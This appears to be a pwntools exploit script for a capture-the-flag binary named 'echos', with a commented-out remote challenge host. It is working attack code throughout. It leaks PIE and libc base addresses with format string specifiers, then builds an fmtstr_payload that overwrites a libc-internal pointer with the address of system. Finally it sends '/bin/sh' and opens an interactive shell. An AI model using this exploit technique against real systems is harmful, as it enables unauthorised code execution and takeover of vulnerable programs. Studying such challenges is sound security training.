from pwn import *

# p = process("./echos")
context.arch = 'amd64'

def offset_finder():
    for x in range (1, 2):
        p = process("./echos")
        # p = remote("stack.overflow.fail", 9002)
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "A" * 8
        payload += "%{}$p".format(3)
        gdb.attach(p, 'b *main+51')
        p.sendline(payload)
        
        p.recvuntil("AAAAAAAA")
        stack_value = p.recvline()[:-1]
        if stack_value.find("41414141") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.interactive()

def exploit():
    p = process("./echos")
    binary = ELF("./echos")

    printf_got = binary.got['printf']

    payload = ''
    payload += '%14$p-%19$p'
    #offset libc start main 0x21b97
    p.sendline(payload)

    leaks = p.recvline()[:-1].split("-")
    print leaks
    
    pie_leak = int(leaks[0], 16) - 0x890
    log.info("PIE Base Leak: {}".format(hex(pie_leak)))
    libc_base_leak = int(leaks[1], 16) - 0x21b97
    log.info("Libc Base Leak: {}".format(hex(libc_base_leak)))
    one_gadget_addr = libc_base_leak + 0x4f365
    log.info("One gadget addr: {}".format(hex(one_gadget_addr)))
    libc_system = libc_base_leak + 0x04f4e0
    log.info("Libc system : {}".format(hex(libc_system)))
    to_overwrite = libc_base_leak + 0x3eb048
    log.info("Will overwrite address: {}".format(hex(to_overwrite)))
    libc_system_over = (libc_system & 0xffffffff) << 32
    log.info("Overwrite 4 bytes from system: {}".format(hex(libc_system_over)))
    
    # payload = ''
    payload = fmtstr_payload(8, {
        to_overwrite - 4: libc_system_over,
    }, write_size='short')

    # gdb.attach(p, 'b *main+51')

    p.sendline(payload)
    p.sendline("/bin/sh")

    p.interactive()

if __name__ == "__main__":
    # offset_finder()
    exploit()